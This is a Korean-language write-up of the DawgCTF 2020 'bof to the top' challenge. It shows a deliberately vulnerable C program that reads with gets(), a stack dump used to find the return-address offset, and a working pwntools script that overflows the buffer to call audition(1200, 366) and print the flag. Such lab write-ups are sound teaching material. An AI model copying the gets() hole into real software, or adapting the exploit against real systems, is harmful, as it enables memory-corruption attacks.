# [WriteUp]DawgCTF 2020 - bof to the top

:black_nib:N1be(sj.dr.nibe@gmail.com)

---

## Overview

### source code

```c
#include "stdio.h"
#include "string.h"
#include "stdlib.h"

// gcc -m32 -fno-stack-protector -no-pie bof.c -o bof

void audition(int time, int room_num){
	char* flag = "/bin/cat flag.txt";
	if(time == 1200 && room_num == 366){
		system(flag);
	}
}

void get_audition_info(){
	char name[50];
	char song[50];
	printf("What's your name?\n");
	gets(name);
	printf("What song will you be singing?\n");
	gets(song);
}

void welcome(){
	printf("Welcome to East High!\n");
	printf("We're the Wildcats and getting ready for our spring musical\n");
	printf("We're now accepting signups for auditions!\n");
}

int main(){
	welcome();
	get_audition_info();
	return 0;
}

```

`get_audition_info()`에서 `gets()`로 입력을 받아서 buffer overflow(BOF)가 발생한다. `audition()`에 플래그를 주는 코드가 있는데, BOF로 실행 흐름을 조작해서 `audition()`을 실행시켜야 하는 것 같다. `time`이 1200이고 `room_num`이 366이면 플래그를 주기 때문에 `audition(1200, 366);`을 실행시키면 될 것 같다.

### Mitigation

```shell
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

canary가 없기 때문에 return address를 그냥 덮을 수 있고, PIE가 걸려 있지 않기 때문에 `audition()`의 주소를 그대로 가져와서 사용할 수 있다.

---

## Exploit plan

```shell
gdb-peda$ r
Starting program: /home/dr-nibe/DawgCTF2020/bof 
Welcome to East High!
We're the Wildcats and getting ready for our spring musical
We're now accepting signups for auditions!
What's your name?
AAAA
What song will you be singing?
BBBB
...
gdb-peda$ x/40wx $esp
0xffffd0d0:	0xffffd0ec	0x0804d1a0	0x0000002b	0x080491d0
0xffffd0e0:	0x00000001	0x00000000	0xf7e49abd	0x42424242
0xffffd0f0:	0xf7fb4d00	0x0000002a	0xffffd138	0xf7e3cd1b
0xffffd100:	0xf7fb4d20	0x0000000a	0x0000002a	0xf7ed289b
0xffffd110:	0xf7fb2a60	0xf7fb4000	0xf7fb4dbc	0x4141002a
0xffffd120:	0xff004141	0xf7fe8e24	0xffffd194	0x0804c000
0xffffd130:	0xf7fb4000	0xf7fb4000	0xffffd158	0x08049263
0xffffd140:	0x0804a0a0	0xffffd204	0xffffd20c	0x0804922a
0xffffd150:	0xf7fe39f0	0x00000000	0xffffd168	0x08049286
0xffffd160:	0xf7fb4000	0xf7fb4000	0x00000000	0xf7de9fb9
gdb-peda$ i r ebp
ebp            0xffffd158          0xffffd158
```

`name`에 `"AAAA"`를 입력하고 `song`에 `"BBBB"`를 입력한 후 스택의 상태이다. `name`은 `0xffffd11e`부터 저장되고, `song`은 `0xffffd0ec`부터 저장된다.

`ebp`가 `0xffffd158`이므로 `get_audition_info()`의 return address는 `0xffffd15c`에 위치한다. 이 주소는 `name`과 `0x3e`만큼 떨어져 있다.

32비트 시스템의 calling convention을 생각해 보면, 함수가 실행될 때 그 함수의 return address를 먼저 `pop`하고 나서 매개변수들을 차례로 `pop`한다. 따라서 스택의 낮은 주소부터 `audition()`의 주소 - dummy(4바이트) - 1200 - 366 순서로 배치해 두면 `audition(1200, 366);`이 호출될 것이다. 그러면 플래그를 얻을 수 있기 때문에 그 다음에 dummy 때문에 오류가 나는 건 신경쓰지 않아도 된다.

---

## Exploit

```python
# exploit_bof.py

from pwn import *

# r = process("./bof")
r = remote("ctf.umbccd.io", 4000)

audition = 0x8049182 # address of audition()

payload = "A" * 0x3e # dummy
payload += p32(audition)
payload += "BBBB" # dummy
payload += p32(1200) # first parameter
payload += p32(366) # second parameter

r.recvuntil("What's your name?\n")
r.sendline(payload)
r.recvuntil("What song will you be singing?\n")
r.sendline("")

r.interactive()
```

```shell
dr-nibe@ubuntu:~/DawgCTF2020$ python exploit_bof.py
[+] Opening connection to ctf.umbccd.io on port 4000: Done
[*] Switching to interactive mode
DawgCTF{wh@t_teAm?}
[*] Got EOF while reading in interactive
$  
```

